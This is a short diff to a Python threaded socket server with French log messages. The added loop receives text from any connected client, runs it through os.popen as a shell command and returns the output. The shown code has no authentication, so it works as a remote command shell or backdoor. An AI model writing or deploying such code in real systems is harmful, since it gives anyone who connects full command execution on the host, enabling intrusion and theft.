@@ -13,7 +13,12 @@ class ClientThread(threading.Thread):
 		self.clientsocket = clientsocket
 		print('## Nouveau thread pour ', self.ip,': ', self.port)
 	def run(self):
-
-		print('Connection de ',self.ip,': ',self.port)
+		data = " "
+		while data != "exit":
 		
-		r = self.clientsocket.recv(2048)
+			data = self.clientsocket.recv(2048)
+			
+			rep = os.popen(data.decode())
+			self.clientsocket.send(rep.read().encode())
+		print('Fin du thread ', self.port)
+
